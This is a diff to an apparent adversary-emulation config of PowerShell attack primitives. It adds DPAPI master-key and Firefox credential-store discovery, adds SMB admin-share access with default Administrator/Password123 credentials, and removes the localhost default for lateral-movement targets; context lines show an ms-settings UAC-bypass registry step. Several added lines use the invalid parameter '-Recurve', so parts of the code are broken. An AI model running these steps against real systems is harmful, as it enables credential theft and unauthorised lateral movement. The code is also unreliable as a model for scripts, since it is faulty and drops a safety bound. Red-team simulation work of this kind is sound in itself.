@@ -154,9 +154,7 @@ primitives:
 
           New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
 
-          # Structural cleanup to maintain target sanitation bounds
-
-          Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurve -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
 
 
   process_injection:
@@ -269,6 +267,14 @@ primitives:
 
           [Windows.Security.Credentials.CredentialVault, Windows.Security.Credentials, ContentType=WindowsRuntime] | Out-Null
 
+      - name: dpapi_masterkey_audit
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Auditing DPAPI MasterKey storage structures (T1555)..."
+
+          Get-ChildItem -Path "$env:APPDATA\Microsoft\Protect" -Recurve -ErrorAction SilentlyContinue | Select-Object FullName -First 10
+
 
   browser_credential_access:
 
@@ -281,6 +287,14 @@ primitives:
           Write-Output "[Telemetry Simulation] Simulating baseline browser storage file discovery lookups."
 
           Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data" -Filter "Login Data" -Recurve -ErrorAction SilentlyContinue
+
+      - name: firefox_profile_recon
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Auditing Firefox Profile Database Storage Signs..."
+
+          Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Include "logins.json", "key4.db" -Recurve -ErrorAction SilentlyContinue
 
 
   lsass_access:
@@ -341,8 +355,6 @@ primitives:
 
         script: |
 
-          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
-
           $target = $TARGETS | Get-Random
 
           Write-Output "Simulating incoming lateral network pathing interface to host: $target"
@@ -358,15 +370,13 @@ primitives:
 
         script: |
 
-          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
-
           if (-not $USER) { $USER = "Administrator" }
 
           if (-not $PASS) { $PASS = "Password123" }
 
           $target = $TARGETS | Get-Random
 
-          
+          Write-Output "Probing remote SMB share lines on target node: $target"
 
           net use \\$target\C$ /user:$USER "$PASS" -ErrorAction SilentlyContinue
 
@@ -382,8 +392,6 @@ primitives:
       - name: remote_exec_cim
 
         script: |
-
-          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
 
           $target = $TARGETS | Get-Random
 
@@ -461,6 +469,6 @@ primitives:
 
           Write-Output "Executing localized range cleanup primitives..."
 
-          if (Test-Path "C:\ProgramData\RangeEngine\Staging") { Remove-Item -Path "C:\ProgramData\RangeEngine\Staging" -Recurve -Force }
+          if (Test-Path "C:\ProgramData\RangeEngine\Staging") { Remove-Item -Path "C:\ProgramData\RangeEngine\Staging" -Recurse -Force }
 
           if (Test-Path "C:\ProgramData\RangeEngine\staged_data.zip") { Remove-Item -Path "C:\ProgramData\RangeEngine\staged_data.zip" -Force }
